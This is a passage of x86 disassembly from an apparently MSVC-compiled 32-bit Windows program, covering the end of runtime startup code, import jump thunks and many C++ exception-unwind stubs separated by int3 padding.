  40a888:	3c 20                	cmp    $0x20,%al
  40a88a:	76 f2                	jbe    0x40a87e
  40a88c:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  40a88f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40a892:	50                   	push   %eax
  40a893:	ff 15 94 b1 40 00    	call   *0x40b194
  40a899:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  40a89d:	74 11                	je     0x40a8b0
  40a89f:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  40a8a3:	eb 0e                	jmp    0x40a8b3
  40a8a5:	80 3e 20             	cmpb   $0x20,(%esi)
  40a8a8:	76 d8                	jbe    0x40a882
  40a8aa:	46                   	inc    %esi
  40a8ab:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40a8ae:	eb f5                	jmp    0x40a8a5
  40a8b0:	6a 0a                	push   $0xa
  40a8b2:	58                   	pop    %eax
  40a8b3:	50                   	push   %eax
  40a8b4:	56                   	push   %esi
  40a8b5:	53                   	push   %ebx
  40a8b6:	53                   	push   %ebx
  40a8b7:	ff 15 d4 b1 40 00    	call   *0x40b1d4
  40a8bd:	50                   	push   %eax
  40a8be:	e8 2d e5 ff ff       	call   0x408df0
  40a8c3:	89 45 98             	mov    %eax,-0x68(%ebp)
  40a8c6:	50                   	push   %eax
  40a8c7:	ff 15 84 b2 40 00    	call   *0x40b284
  40a8cd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40a8d0:	8b 08                	mov    (%eax),%ecx
  40a8d2:	8b 09                	mov    (%ecx),%ecx
  40a8d4:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  40a8d7:	50                   	push   %eax
  40a8d8:	51                   	push   %ecx
  40a8d9:	e8 16 00 00 00       	call   0x40a8f4
  40a8de:	59                   	pop    %ecx
  40a8df:	59                   	pop    %ecx
  40a8e0:	c3                   	ret
  40a8e1:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40a8e4:	ff 75 88             	push   -0x78(%ebp)
  40a8e7:	ff 15 7c b2 40 00    	call   *0x40b27c
  40a8ed:	cc                   	int3
  40a8ee:	ff 25 78 b2 40 00    	jmp    *0x40b278
  40a8f4:	ff 25 80 b2 40 00    	jmp    *0x40b280
  40a8fa:	ff 25 90 b2 40 00    	jmp    *0x40b290
  40a900:	68 00 00 03 00       	push   $0x30000
  40a905:	68 00 00 01 00       	push   $0x10000
  40a90a:	e8 07 00 00 00       	call   0x40a916
  40a90f:	59                   	pop    %ecx
  40a910:	59                   	pop    %ecx
  40a911:	c3                   	ret
  40a912:	33 c0                	xor    %eax,%eax
  40a914:	c3                   	ret
  40a915:	c3                   	ret
  40a916:	ff 25 a8 b2 40 00    	jmp    *0x40b2a8
  40a91c:	ff 25 c0 b1 40 00    	jmp    *0x40b1c0
  40a922:	ff 25 c4 b1 40 00    	jmp    *0x40b1c4
  40a928:	ff 25 c8 b1 40 00    	jmp    *0x40b1c8
  40a92e:	ff 25 94 b3 40 00    	jmp    *0x40b394
  40a934:	ff 25 78 b0 40 00    	jmp    *0x40b078
  40a93a:	ff 25 00 b0 40 00    	jmp    *0x40b000
  40a940:	ff 25 2c b0 40 00    	jmp    *0x40b02c
  40a946:	ff 25 30 b0 40 00    	jmp    *0x40b030
  40a94c:	cc                   	int3
  40a94d:	cc                   	int3
  40a94e:	cc                   	int3
  40a94f:	cc                   	int3
  40a950:	ff 25 84 b0 40 00    	jmp    *0x40b084
  40a956:	ff 25 80 b0 40 00    	jmp    *0x40b080
  40a95c:	ff 25 c4 b2 40 00    	jmp    *0x40b2c4
  40a962:	ff 25 b8 b2 40 00    	jmp    *0x40b2b8
  40a968:	ff 25 cc b2 40 00    	jmp    *0x40b2cc
  40a96e:	ff 25 c8 b2 40 00    	jmp    *0x40b2c8
  40a974:	ff 25 b4 b2 40 00    	jmp    *0x40b2b4
  40a97a:	ff 25 c0 b2 40 00    	jmp    *0x40b2c0
  40a980:	ff 25 bc b2 40 00    	jmp    *0x40b2bc
  40a986:	ff 25 d4 b2 40 00    	jmp    *0x40b2d4
  40a98c:	ff 25 d8 b2 40 00    	jmp    *0x40b2d8
  40a992:	ff 25 38 b4 40 00    	jmp    *0x40b438
  40a998:	ff 25 3c b4 40 00    	jmp    *0x40b43c
  40a99e:	cc                   	int3
  40a99f:	cc                   	int3
  40a9a0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a9a3:	e9 c8 b5 ff ff       	jmp    0x405f70
  40a9a8:	b8 70 b5 40 00       	mov    $0x40b570,%eax
  40a9ad:	e9 3a fd ff ff       	jmp    0x40a6ec
  40a9b2:	cc                   	int3
  40a9b3:	cc                   	int3
  40a9b4:	cc                   	int3
  40a9b5:	cc                   	int3
  40a9b6:	cc                   	int3
  40a9b7:	cc                   	int3
  40a9b8:	cc                   	int3
  40a9b9:	cc                   	int3
  40a9ba:	cc                   	int3
  40a9bb:	cc                   	int3
  40a9bc:	cc                   	int3
  40a9bd:	cc                   	int3
  40a9be:	cc                   	int3
  40a9bf:	cc                   	int3
  40a9c0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40a9c3:	e9 a8 b5 ff ff       	jmp    0x405f70
  40a9c8:	b8 98 b5 40 00       	mov    $0x40b598,%eax
  40a9cd:	e9 1a fd ff ff       	jmp    0x40a6ec
  40a9d2:	cc                   	int3
  40a9d3:	cc                   	int3
  40a9d4:	cc                   	int3
  40a9d5:	cc                   	int3
  40a9d6:	cc                   	int3
  40a9d7:	cc                   	int3
  40a9d8:	cc                   	int3
  40a9d9:	cc                   	int3
  40a9da:	cc                   	int3
  40a9db:	cc                   	int3
  40a9dc:	cc                   	int3
  40a9dd:	cc                   	int3
  40a9de:	cc                   	int3
  40a9df:	cc                   	int3
  40a9e0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40a9e3:	50                   	push   %eax
  40a9e4:	e8 fd fc ff ff       	call   0x40a6e6
  40a9e9:	59                   	pop    %ecx
  40a9ea:	c3                   	ret
  40a9eb:	b8 c0 b5 40 00       	mov    $0x40b5c0,%eax
  40a9f0:	e9 f7 fc ff ff       	jmp    0x40a6ec
  40a9f5:	cc                   	int3
  40a9f6:	cc                   	int3
  40a9f7:	cc                   	int3
  40a9f8:	cc                   	int3
  40a9f9:	cc                   	int3
  40a9fa:	cc                   	int3
  40a9fb:	cc                   	int3
  40a9fc:	cc                   	int3
  40a9fd:	cc                   	int3
  40a9fe:	cc                   	int3
  40a9ff:	cc                   	int3
  40aa00:	8b 8d 60 fe ff ff    	mov    -0x1a0(%ebp),%ecx
  40aa06:	83 c1 04             	add    $0x4,%ecx
  40aa09:	e9 e2 6d ff ff       	jmp    0x4017f0
  40aa0e:	8b 8d 60 fe ff ff    	mov    -0x1a0(%ebp),%ecx
  40aa14:	83 c1 2c             	add    $0x2c,%ecx
  40aa17:	e9 d4 6d ff ff       	jmp    0x4017f0
  40aa1c:	8b 8d 60 fe ff ff    	mov    -0x1a0(%ebp),%ecx
  40aa22:	83 c1 54             	add    $0x54,%ecx
  40aa25:	e9 c6 6d ff ff       	jmp    0x4017f0
  40aa2a:	b8 e8 b5 40 00       	mov    $0x40b5e8,%eax
  40aa2f:	e9 b8 fc ff ff       	jmp    0x40a6ec
  40aa34:	cc                   	int3
  40aa35:	cc                   	int3
  40aa36:	cc                   	int3
  40aa37:	cc                   	int3
  40aa38:	cc                   	int3
  40aa39:	cc                   	int3
  40aa3a:	cc                   	int3
  40aa3b:	cc                   	int3
  40aa3c:	cc                   	int3
  40aa3d:	cc                   	int3
  40aa3e:	cc                   	int3
  40aa3f:	cc                   	int3
  40aa40:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa43:	83 c1 04             	add    $0x4,%ecx
  40aa46:	e9 a5 6d ff ff       	jmp    0x4017f0
  40aa4b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa4e:	83 c1 2c             	add    $0x2c,%ecx
  40aa51:	e9 9a 6d ff ff       	jmp    0x4017f0
  40aa56:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa59:	83 c1 54             	add    $0x54,%ecx
  40aa5c:	e9 8f 6d ff ff       	jmp    0x4017f0
  40aa61:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa64:	83 c1 7c             	add    $0x7c,%ecx
  40aa67:	e9 84 6d ff ff       	jmp    0x4017f0
  40aa6c:	b8 20 b6 40 00       	mov    $0x40b620,%eax
  40aa71:	e9 76 fc ff ff       	jmp    0x40a6ec
  40aa76:	cc                   	int3
  40aa77:	cc                   	int3
  40aa78:	cc                   	int3
  40aa79:	cc                   	int3
  40aa7a:	cc                   	int3
  40aa7b:	cc                   	int3
  40aa7c:	cc                   	int3
  40aa7d:	cc                   	int3
  40aa7e:	cc                   	int3
  40aa7f:	cc                   	int3
  40aa80:	b8 c0 b6 40 00       	mov    $0x40b6c0,%eax
  40aa85:	e9 62 fc ff ff       	jmp    0x40a6ec
  40aa8a:	cc                   	int3
  40aa8b:	cc                   	int3
  40aa8c:	cc                   	int3
  40aa8d:	cc                   	int3
  40aa8e:	cc                   	int3
  40aa8f:	cc                   	int3
  40aa90:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa93:	e9 d8 b4 ff ff       	jmp    0x405f70
  40aa98:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40aa9b:	83 c1 10             	add    $0x10,%ecx
  40aa9e:	e9 4d 9b ff ff       	jmp    0x4045f0
  40aaa3:	b8 18 b7 40 00       	mov    $0x40b718,%eax
  40aaa8:	e9 3f fc ff ff       	jmp    0x40a6ec
  40aaad:	cc                   	int3
  40aaae:	cc                   	int3
  40aaaf:	cc                   	int3
  40aab0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40aab3:	e9 b8 b4 ff ff       	jmp    0x405f70
  40aab8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40aabb:	83 c1 10             	add    $0x10,%ecx
  40aabe:	e9 2d 9b ff ff       	jmp    0x4045f0
  40aac3:	b8 48 b7 40 00       	mov    $0x40b748,%eax
  40aac8:	e9 1f fc ff ff       	jmp    0x40a6ec
  40aacd:	cc                   	int3
  40aace:	cc                   	int3
  40aacf:	cc                   	int3
  40aad0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40aad3:	ff 25 24 b2 40 00    	jmp    *0x40b224
  40aad9:	b8 78 b7 40 00       	mov    $0x40b778,%eax
  40aade:	e9 09 fc ff ff       	jmp    0x40a6ec
  40aae3:	cc                   	int3
  40aae4:	cc                   	int3
  40aae5:	cc                   	int3
  40aae6:	cc                   	int3
  40aae7:	cc                   	int3
  40aae8:	cc                   	int3
  40aae9:	cc                   	int3
  40aaea:	cc                   	int3
  40aaeb:	cc                   	int3
  40aaec:	cc                   	int3
  40aaed:	cc                   	int3
  40aaee:	cc                   	int3
  40aaef:	cc                   	int3
  40aaf0:	8d 8d 94 fb ff ff    	lea    -0x46c(%ebp),%ecx
  40aaf6:	ff 25 24 b2 40 00    	jmp    *0x40b224
  40aafc:	b8 a0 b7 40 00       	mov    $0x40b7a0,%eax
  40ab01:	e9 e6 fb ff ff       	jmp    0x40a6ec
  40ab06:	cc                   	int3
  40ab07:	cc                   	int3
  40ab08:	cc                   	int3
  40ab09:	cc                   	int3
  40ab0a:	cc                   	int3
  40ab0b:	cc                   	int3
  40ab0c:	cc                   	int3
  40ab0d:	cc                   	int3
  40ab0e:	cc                   	int3
  40ab0f:	cc                   	int3
  40ab10:	8b 45 04             	mov    0x4(%ebp),%eax
  40ab13:	50                   	push   %eax
  40ab14:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ab17:	51                   	push   %ecx
  40ab18:	e8 f3 9c ff ff       	call   0x404810
  40ab1d:	83 c4 08             	add    $0x8,%esp
  40ab20:	c3                   	ret
  40ab21:	b8 c8 b7 40 00       	mov    $0x40b7c8,%eax
  40ab26:	e9 c1 fb ff ff       	jmp    0x40a6ec
  40ab2b:	cc                   	int3
  40ab2c:	cc                   	int3
  40ab2d:	cc                   	int3
  40ab2e:	cc                   	int3
  40ab2f:	cc                   	int3
  40ab30:	8d 8d 0c fe ff ff    	lea    -0x1f4(%ebp),%ecx
  40ab36:	e9 05 71 ff ff       	jmp    0x401c40
  40ab3b:	8d 8d c4 fe ff ff    	lea    -0x13c(%ebp),%ecx
  40ab41:	e9 5a 87 ff ff       	jmp    0x4032a0
  40ab46:	b8 f0 b7 40 00       	mov    $0x40b7f0,%eax
  40ab4b:	e9 9c fb ff ff       	jmp    0x40a6ec
  40ab50:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40ab56:	e9 e5 70 ff ff       	jmp    0x401c40
  40ab5b:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  40ab61:	e9 aa d4 ff ff       	jmp    0x408010
  40ab66:	b8 20 b8 40 00       	mov    $0x40b820,%eax
  40ab6b:	e9 7c fb ff ff       	jmp    0x40a6ec
  40ab70:	8d 8d 90 fe ff ff    	lea    -0x170(%ebp),%ecx
  40ab76:	e9 c5 70 ff ff       	jmp    0x401c40
  40ab7b:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  40ab81:	e9 3a bd ff ff       	jmp    0x4068c0
  40ab86:	b8 50 b8 40 00       	mov    $0x40b850,%eax
  40ab8b:	e9 5c fb ff ff       	jmp    0x40a6ec
  40ab90:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40ab96:	e9 a5 70 ff ff       	jmp    0x401c40
  40ab9b:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  40aba1:	e9 5a f5 ff ff       	jmp    0x40a100
  40aba6:	b8 80 b8 40 00       	mov    $0x40b880,%eax
  40abab:	e9 3c fb ff ff       	jmp    0x40a6ec
  40abb0:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40abb6:	e9 85 70 ff ff       	jmp    0x401c40
  40abbb:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40abc1:	e9 da 69 ff ff       	jmp    0x4015a0
  40abc6:	b8 b0 b8 40 00       	mov    $0x40b8b0,%eax
  40abcb:	e9 1c fb ff ff       	jmp    0x40a6ec
  40abd0:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40abd6:	e9 65 70 ff ff       	jmp    0x401c40
  40abdb:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40abe1:	e9 3a b1 ff ff       	jmp    0x405d20
  40abe6:	b8 e0 b8 40 00       	mov    $0x40b8e0,%eax
  40abeb:	e9 fc fa ff ff       	jmp    0x40a6ec
  40abf0:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40abf6:	e9 45 70 ff ff       	jmp    0x401c40
  40abfb:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40ac01:	e9 9a e2 ff ff       	jmp    0x408ea0
  40ac06:	b8 10 b9 40 00       	mov    $0x40b910,%eax
  40ac0b:	e9 dc fa ff ff       	jmp    0x40a6ec
  40ac10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ac13:	e9 58 b3 ff ff       	jmp    0x405f70
  40ac18:	b8 40 b9 40 00       	mov    $0x40b940,%eax
  40ac1d:	e9 ca fa ff ff       	jmp    0x40a6ec
  40ac22:	cc                   	int3
  40ac23:	cc                   	int3
  40ac24:	cc                   	int3
  40ac25:	cc                   	int3
  40ac26:	cc                   	int3
  40ac27:	cc                   	int3
  40ac28:	cc                   	int3
  40ac29:	cc                   	int3
  40ac2a:	cc                   	int3
  40ac2b:	cc                   	int3
  40ac2c:	cc                   	int3
  40ac2d:	cc                   	int3
  40ac2e:	cc                   	int3
  40ac2f:	cc                   	int3
  40ac30:	b8 68 b9 40 00       	mov    $0x40b968,%eax
  40ac35:	e9 b2 fa ff ff       	jmp    0x40a6ec
  40ac3a:	cc                   	int3
  40ac3b:	cc                   	int3
  40ac3c:	cc                   	int3
  40ac3d:	cc                   	int3
  40ac3e:	cc                   	int3
  40ac3f:	cc                   	int3
  40ac40:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40ac43:	e9 28 b3 ff ff       	jmp    0x405f70
  40ac48:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40ac4b:	83 c1 24             	add    $0x24,%ecx
  40ac4e:	e9 dd bb ff ff       	jmp    0x406830
  40ac53:	8b 45 04             	mov    0x4(%ebp),%eax
  40ac56:	50                   	push   %eax
  40ac57:	e8 8a fa ff ff       	call   0x40a6e6
  40ac5c:	59                   	pop    %ecx
  40ac5d:	c3                   	ret
  40ac5e:	b8 c0 b9 40 00       	mov    $0x40b9c0,%eax
  40ac63:	e9 84 fa ff ff       	jmp    0x40a6ec
  40ac68:	cc                   	int3
  40ac69:	cc                   	int3
  40ac6a:	cc                   	int3
  40ac6b:	cc                   	int3
  40ac6c:	cc                   	int3
  40ac6d:	cc                   	int3
  40ac6e:	cc                   	int3
  40ac6f:	cc                   	int3
  40ac70:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ac73:	e9 f8 b2 ff ff       	jmp    0x405f70
  40ac78:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ac7b:	83 c1 24             	add    $0x24,%ecx
  40ac7e:	e9 ad bb ff ff       	jmp    0x406830
  40ac83:	b8 f8 b9 40 00       	mov    $0x40b9f8,%eax
  40ac88:	e9 5f fa ff ff       	jmp    0x40a6ec
  40ac8d:	cc                   	int3
  40ac8e:	cc                   	int3
  40ac8f:	cc                   	int3
  40ac90:	8b 45 04             	mov    0x4(%ebp),%eax
  40ac93:	50                   	push   %eax
  40ac94:	e8 4d fa ff ff       	call   0x40a6e6
  40ac99:	59                   	pop    %ecx
  40ac9a:	c3                   	ret
  40ac9b:	8b 45 04             	mov    0x4(%ebp),%eax
  40ac9e:	50                   	push   %eax
  40ac9f:	e8 42 fa ff ff       	call   0x40a6e6
  40aca4:	59                   	pop    %ecx
  40aca5:	c3                   	ret
  40aca6:	8b 45 04             	mov    0x4(%ebp),%eax
  40aca9:	50                   	push   %eax
  40acaa:	e8 37 fa ff ff       	call   0x40a6e6
  40acaf:	59                   	pop    %ecx
  40acb0:	c3                   	ret
  40acb1:	b8 28 ba 40 00       	mov    $0x40ba28,%eax
  40acb6:	e9 31 fa ff ff       	jmp    0x40a6ec
  40acbb:	cc                   	int3
  40acbc:	cc                   	int3
  40acbd:	cc                   	int3
  40acbe:	cc                   	int3
  40acbf:	cc                   	int3
  40acc0:	b8 60 ba 40 00       	mov    $0x40ba60,%eax
  40acc5:	e9 22 fa ff ff       	jmp    0x40a6ec
  40acca:	cc                   	int3
  40accb:	cc                   	int3
  40accc:	cc                   	int3
  40accd:	cc                   	int3
  40acce:	cc                   	int3
  40accf:	cc                   	int3
  40acd0:	b8 b8 ba 40 00       	mov    $0x40bab8,%eax
  40acd5:	e9 12 fa ff ff       	jmp    0x40a6ec
  40acda:	cc                   	int3
  40acdb:	cc                   	int3
  40acdc:	cc                   	int3
  40acdd:	cc                   	int3
  40acde:	cc                   	int3
  40acdf:	cc                   	int3
  40ace0:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40ace3:	81 c1 88 00 00 00    	add    $0x88,%ecx
  40ace9:	e9 42 bb ff ff       	jmp    0x406830
  40acee:	b8 10 bb 40 00       	mov    $0x40bb10,%eax
  40acf3:	e9 f4 f9 ff ff       	jmp    0x40a6ec
  40acf8:	cc                   	int3
  40acf9:	cc                   	int3
  40acfa:	cc                   	int3
  40acfb:	cc                   	int3
  40acfc:	cc                   	int3
  40acfd:	cc                   	int3
  40acfe:	cc                   	int3
  40acff:	cc                   	int3
  40ad00:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ad03:	81 c1 88 00 00 00    	add    $0x88,%ecx
  40ad09:	e9 22 bb ff ff       	jmp    0x406830
  40ad0e:	b8 38 bb 40 00       	mov    $0x40bb38,%eax
  40ad13:	e9 d4 f9 ff ff       	jmp    0x40a6ec
  40ad18:	cc                   	int3
  40ad19:	cc                   	int3
  40ad1a:	cc                   	int3
  40ad1b:	cc                   	int3
  40ad1c:	cc                   	int3
  40ad1d:	cc                   	int3
  40ad1e:	cc                   	int3
  40ad1f:	cc                   	int3
  40ad20:	8b 8d a8 fe ff ff    	mov    -0x158(%ebp),%ecx
  40ad26:	e9 45 b2 ff ff       	jmp    0x405f70
  40ad2b:	b8 60 bb 40 00       	mov    $0x40bb60,%eax
  40ad30:	e9 b7 f9 ff ff       	jmp    0x40a6ec
  40ad35:	cc                   	int3
  40ad36:	cc                   	int3
  40ad37:	cc                   	int3
  40ad38:	cc                   	int3
  40ad39:	cc                   	int3
  40ad3a:	cc                   	int3
  40ad3b:	cc                   	int3
  40ad3c:	cc                   	int3
  40ad3d:	cc                   	int3
  40ad3e:	cc                   	int3
  40ad3f:	cc                   	int3
  40ad40:	8d 8d ac 5f ff ff    	lea    -0xa054(%ebp),%ecx
  40ad46:	e9 f5 6e ff ff       	jmp    0x401c40
  40ad4b:	8d 8d 98 61 ff ff    	lea    -0x9e68(%ebp),%ecx
  40ad51:	e9 ca aa ff ff       	jmp    0x405820
  40ad56:	b8 88 bb 40 00       	mov    $0x40bb88,%eax
  40ad5b:	e9 8c f9 ff ff       	jmp    0x40a6ec
  40ad60:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40ad63:	e9 08 b2 ff ff       	jmp    0x405f70
  40ad68:	b8 b8 bb 40 00       	mov    $0x40bbb8,%eax
  40ad6d:	e9 7a f9 ff ff       	jmp    0x40a6ec
  40ad72:	cc                   	int3
  40ad73:	cc                   	int3
  40ad74:	cc                   	int3
  40ad75:	cc                   	int3
  40ad76:	cc                   	int3
  40ad77:	cc                   	int3
  40ad78:	cc                   	int3
  40ad79:	cc                   	int3
  40ad7a:	cc                   	int3
  40ad7b:	cc                   	int3
  40ad7c:	cc                   	int3
  40ad7d:	cc                   	int3
  40ad7e:	cc                   	int3
  40ad7f:	cc                   	int3
  40ad80:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40ad83:	e9 08 77 ff ff       	jmp    0x402490
  40ad88:	b8 e0 bb 40 00       	mov    $0x40bbe0,%eax
  40ad8d:	e9 5a f9 ff ff       	jmp    0x40a6ec
  40ad92:	cc                   	int3
  40ad93:	cc                   	int3
  40ad94:	cc                   	int3
  40ad95:	cc                   	int3
  40ad96:	cc                   	int3
  40ad97:	cc                   	int3
  40ad98:	cc                   	int3
  40ad99:	cc                   	int3
  40ad9a:	cc                   	int3
  40ad9b:	cc                   	int3
  40ad9c:	cc                   	int3
  40ad9d:	cc                   	int3
  40ad9e:	cc                   	int3
  40ad9f:	cc                   	int3
  40ada0:	b8 08 bc 40 00       	mov    $0x40bc08,%eax
  40ada5:	e9 42 f9 ff ff       	jmp    0x40a6ec
  40adaa:	cc                   	int3
  40adab:	cc                   	int3
  40adac:	cc                   	int3
  40adad:	cc                   	int3
  40adae:	cc                   	int3
  40adaf:	cc                   	int3
  40adb0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40adb3:	e9 b8 b1 ff ff       	jmp    0x405f70
  40adb8:	b8 60 bc 40 00       	mov    $0x40bc60,%eax
  40adbd:	e9 2a f9 ff ff       	jmp    0x40a6ec
  40adc2:	cc                   	int3
  40adc3:	cc                   	int3
  40adc4:	cc                   	int3
  40adc5:	cc                   	int3
  40adc6:	cc                   	int3
  40adc7:	cc                   	int3
  40adc8:	cc                   	int3
  40adc9:	cc                   	int3
  40adca:	cc                   	int3
  40adcb:	cc                   	int3
  40adcc:	cc                   	int3
  40adcd:	cc                   	int3
  40adce:	cc                   	int3
  40adcf:	cc                   	int3
  40add0:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40add3:	50                   	push   %eax
  40add4:	e8 0d f9 ff ff       	call   0x40a6e6
  40add9:	59                   	pop    %ecx
  40adda:	c3                   	ret
  40addb:	b8 88 bc 40 00       	mov    $0x40bc88,%eax
  40ade0:	e9 07 f9 ff ff       	jmp    0x40a6ec
